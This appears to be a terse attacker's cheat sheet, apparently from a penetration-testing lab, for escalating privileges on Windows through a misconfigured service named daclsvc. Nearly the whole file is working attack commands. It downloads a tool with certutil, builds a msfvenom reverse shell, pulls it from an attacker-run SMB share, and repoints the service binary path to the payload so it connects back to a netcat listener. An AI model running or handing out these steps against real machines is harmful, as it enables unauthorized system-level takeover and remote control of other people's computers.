$kali_ip = x.x.x.x

:: Download and unzipm AccessChk.exe to enumerate a specific directory for loose permissions
certutil  -urlcache -f https://download.sysinternals.com/files/AccessChk.zip C:\Users\Public\AccessChk.zip
powershell
Expand-Archive -Force C:\Users\Public\AccessChk.zip c:\Users\Public\
exit 
cd C:\Users\Public\
 
accesschk.exe /accepteula -uwcqv user daclsvc



:: Check the current configuration of the service:
sc qc daclsvc


:: Check the current status of the service:
sc query daclsvc

:: REMEMBER to start samba share on Kali first:
 
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=888 -f exe -o /tmp/reverse.exe
:: sudo python /usr/local/bin/smbserver.py tmp /tmp/
:: once copied open a reverse shell listener: nc -nvlp 888
copy \\$kali_ip\tmp\reverse.exe .
:: Reconfigure the service to use our reverse shell executable:
sc config daclsvc binpath= "\"C:\Users\Public\reverse.exe""

:: Start a listener on Kali nc -nvlp 888 , and then start the service to trigger the exploit
net start daclsvc
